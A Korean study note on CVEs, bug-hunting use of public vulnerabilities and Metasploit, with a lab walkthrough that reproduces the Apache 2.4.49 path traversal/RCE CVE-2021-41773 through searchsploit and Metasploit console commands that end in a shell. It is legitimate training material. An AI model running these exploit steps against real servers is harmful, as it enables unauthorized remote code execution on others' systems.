# 1. CVE (Common Vulnerabilities and Exposures)

## 1.1. CVE 개요

- **정의:** CVE는 정보 보안 취약점에 고유한 식별 번호를 부여하는 국제적인 취약점 식별 체계이다.
- **목적:** 취약점을 일관된 방식으로 식별하고 추적하여 보안 취약점에 대한 정보 공유와 대응을 용이하게 한다. 보안 결함에 대한 **공통 언어** 역할을 한다.
- **역사 및 형식:** 초기에는 `CVE-YYYY-NNNN`과 같은 형식으로 사용되었으나, 취약점이 증가하면서 2016년부터 번호 체계가 확장되어 4자리 이상의 일련번호를 사용할 수 있게 되었다.
- **CNA (CVE Numbering Authorities):** CVE 식별자를 할당할 권한을 가진 기관이다. CVE 프로그램은 MITRE를 중심으로 운영되며, 여러 기관과 프로젝트가 CNA로 참여하여 취약점에 CVE ID를 할당할 수 있다.

## 1.2. CVE 부여 기준

모든 버그에 CVE가 부여되는 것은 아니다. CVE 프로그램의 규칙에 따라 취약점으로 식별할 수 있는 조건을 충족해야 한다.

1. **독립적 수정 가능:** 다른 버그와 독립적으로 수정하거나 패치할 수 있어야 한다.
2. **공급자의 인정:** 해당 소프트웨어 공급자가 보안 문제를 인정하거나 관련 정보를 공개·문서화해야 한다.
3. **단일 코드베이스:** 하나의 코드베이스에서 발생한 취약점이어야 한다. 서로 다른 코드베이스에서 동일한 유형의 결함이 발생한 경우에는 각각 별도의 CVE가 부여될 수 있다.

# 2. 버그헌팅에서의 CVE 활용

## 2.1. CVE 활용 방법

버그헌팅에서는 타겟 서비스가 사용하는 **서드파티 소프트웨어, CMS, 프레임워크, 라이브러리 등의 종류와 버전**을 식별한 후 해당 버전에 알려진 CVE가 존재하는지 확인한다.

예를 들어 웹 서버의 제품명과 버전을 확인한 경우 해당 제품의 CVE 데이터베이스를 검색하여 알려진 취약점이 존재하는지 확인할 수 있다.

## 2.2. 장점

- **시간 단축:** 이미 공개된 취약점을 조사하기 때문에 제로데이(0-day) 취약점을 처음부터 발견하는 것보다 빠르게 취약점의 존재 여부와 원리를 파악할 수 있다.
- **학습 용이성:** 공개된 취약점 분석 자료와 PoC(Proof of Concept)를 통해 취약점이 발생하는 원리와 공격 조건을 학습할 수 있다.
- **파생 연구:** 기존 취약점의 원리와 원인을 분석하면 유사한 유형의 취약점을 발견하는 단서로 활용할 수 있다.

## 2.3. 단점

- **중복 제보 가능성:** 이미 공개된 취약점이므로 버그헌팅에서 동일한 취약점을 제보할 경우 Duplicate로 처리될 가능성이 높다.
- **패치 가능성:** 공개된 지 오래된 취약점은 이미 공급자가 패치를 제공했거나 서비스 운영자가 업데이트했을 가능성이 높다.
- **환경 차이:** CVE가 존재한다고 해서 모든 환경에서 동일하게 재현되는 것은 아니므로 실제 서비스의 버전과 설정을 함께 확인해야 한다.

# 3. 메타스플로잇(Metasploit) 프레임워크

## 3.1. 개요

Metasploit은 침투 테스트와 보안 취약점 검증에 활용되는 오픈소스 프레임워크이다.

다양한 취약점에 대한 **Exploit, Payload, Auxiliary 등의 모듈**을 제공하여 보안 연구와 침투 테스트 과정을 체계적으로 수행할 수 있도록 지원한다.

## 3.2. 주요 모듈

- **Exploit:** 특정 취약점의 조건을 이용하여 대상 시스템에서 의도하지 않은 동작을 발생시키는 모듈이다.
- **Payload:** Exploit이 성공한 이후 대상 시스템에서 실행할 동작을 정의한다. 예를 들어 쉘 세션을 생성하는 등의 동작에 사용한다.
- **Auxiliary:** 정보 수집, 스캔, 서비스 확인 등 Exploit 이외의 보조적인 보안 테스트 기능을 제공한다.
- **Encoder:** 페이로드의 표현 형태를 변환하는 기능을 제공한다. 과거에는 특정 보안 장비의 단순한 패턴 탐지를 우회하는 용도로 활용되기도 했지만, 현대의 보안 장비에서는 인코딩만으로 탐지를 회피하기 어려운 경우가 많다.

# 4. CVE-2021-41773 실습

## 4.1. Apache Path Traversal 취약점

CVE-2021-41773은 **Apache HTTP Server 2.4.49**에서 발생한 경로 정규화 문제와 관련된 취약점이다.

특정 조건에서 공격자가 웹 서버의 의도하지 않은 파일에 접근할 수 있는 **Path Traversal**이 발생할 수 있으며, CGI가 활성화된 환경에서는 추가적인 조건을 통해 RCE(Remote Code Execution)로 이어질 수 있다.

따라서 취약점 자체뿐만 아니라 **취약점의 조건과 공격 가능 범위**를 함께 확인해야 한다.

## 4.2. 실습 환경 구축

Docker를 이용하여 취약한 버전인 **Apache 2.4.49**를 사용하는 테스트 환경을 구축한다.

실제 운영 중인 다른 시스템이 아닌 **본인이 통제하는 실습 환경**에서 취약점 검증을 수행해야 한다.

## 4.3. 정보 수집 - Searchsploit

Searchsploit은 Exploit-DB에 등록된 취약점 및 Exploit 정보를 로컬에서 검색할 수 있도록 제공하는 명령줄 도구이다.

다음 명령어를 이용하여 Apache 2.4.49와 관련된 취약점 정보를 검색할 수 있다.

```bash
searchsploit apache 2.4.49
```

Searchsploit을 활용하면 제품명과 버전을 기준으로 관련된 공개 취약점과 참고 자료를 빠르게 확인할 수 있다.

## 4.4. Metasploit 실행

Metasploit 콘솔을 실행한다.

```bash
msfconsole
```

### 1) 취약점 검색

CVE 번호를 기준으로 관련 모듈을 검색한다.

```text
search cve:2021-41773
```

### 2) 모듈 선택

검색 결과에서 필요한 모듈을 선택한다.

```text
use exploit/multi/http/apache_normalize_path_rce
```

### 3) 옵션 확인

현재 선택된 모듈에서 설정해야 하는 옵션을 확인한다.

```text
show options
```

주요 옵션으로는 대상 시스템을 지정하는 `RHOSTS`, 테스트 환경에 따라 연결에 필요한 로컬 주소를 지정하는 `LHOST` 등이 있다.

### 4) 설정

실습 환경의 대상 IP와 자신의 테스트 환경에 맞는 값을 설정한다.

```text
set RHOSTS [타겟IP]
set LHOST [내IP]
```

### 5) 취약점 검증

설정된 환경에서 모듈을 실행하여 취약점이 재현되는지 확인한다.

```text
exploit
```

취약점 조건이 충족되고 공격이 성공하면 세션이 생성될 수 있으며, 실습 환경에서는 이를 통해 RCE가 발생하는 과정을 확인할 수 있다.

# 5. Metasploit 실습 과정

## 5.1. Metasploit - Search

<img width="547" height="456" alt="image" src="https://github.com/user-attachments/assets/f902714b-d754-4c71-9e65-3fd08eda10a9" />
<img width="866" height="459" alt="image" src="https://github.com/user-attachments/assets/d9f9e7d1-7d07-401f-b4bf-ea612b11b5e4" />

## 5.2. Metasploit - Use

<img width="972" height="362" alt="image" src="https://github.com/user-attachments/assets/412b9524-939d-4fed-b77c-f4c31e9a4c06" />

## 5.3. Metasploit - Show Options

<img width="846" height="462" alt="image" src="https://github.com/user-attachments/assets/d6b2b9d9-b7c0-45c9-b518-fa9cf46a2756" />

## 5.4. Metasploit - Set

<img width="941" height="415" alt="image" src="https://github.com/user-attachments/assets/730e331a-ee80-48be-ab21-1a46afe14ecc" />

## 5.5. Metasploit - Show Options

<img width="808" height="457" alt="image" src="https://github.com/user-attachments/assets/9eedfe46-26d4-4d50-9a87-3d507f013a6a" />

## 5.6. Metasploit - Exploit

<img width="961" height="376" alt="image" src="https://github.com/user-attachments/assets/85b5053d-4ca3-4bea-8cf1-321ef64cc70f" />

## 5.7. Metasploit - Shell

<img width="953" height="459" alt="image" src="https://github.com/user-attachments/assets/354bfa17-c573-415a-b7e9-f326c2dfe00a" />

## 5.8. Searchsploit - ExploitDB

<img width="1005" height="406" alt="image" src="https://github.com/user-attachments/assets/8dbb599d-4844-41cb-9564-37d2251f77d3" />

# 6. 핵심내용 (Summary)

1. **CVE는 취약점의 표준 식별자이다.**  
   CVE는 보안 취약점을 식별하고 공유하기 위한 공통 식별 체계이며, 버그헌터는 이를 활용하여 이미 공개된 취약점인 1-day 취약점을 빠르게 조사하고 학습할 수 있다.

2. **Searchsploit은 공개된 취약점 정보를 빠르게 검색하는 데 유용하다.**  
   제품명과 버전을 기준으로 Exploit-DB에 등록된 관련 취약점과 참고 자료를 로컬에서 검색할 수 있다.

3. **Metasploit은 취약점 검증 과정을 체계화한다.**  
   일반적으로 `search → use → show options → set → exploit`과 같은 흐름으로 모듈을 탐색하고 설정한 뒤 실습 환경에서 취약점을 검증할 수 있다.

4. **취약점은 연쇄적으로 더 큰 영향으로 이어질 수 있다.**  
   CVE-2021-41773 사례처럼 단순한 Path Traversal 취약점이 특정 조건에서는 RCE로 이어질 수 있으므로, 취약점의 존재 여부뿐만 아니라 발생 조건과 최종적인 영향 범위까지 분석하는 능력이 필요하다.

5. **자동화 도구는 취약점의 원리를 이해한 상태에서 활용해야 한다.**  
   Metasploit과 Searchsploit은 취약점 검증을 효율적으로 수행할 수 있도록 도와주는 도구이지만, 도구의 사용법만 익히는 것보다 취약점이 발생하는 원리와 공격 조건을 이해하는 것이 중요하다.
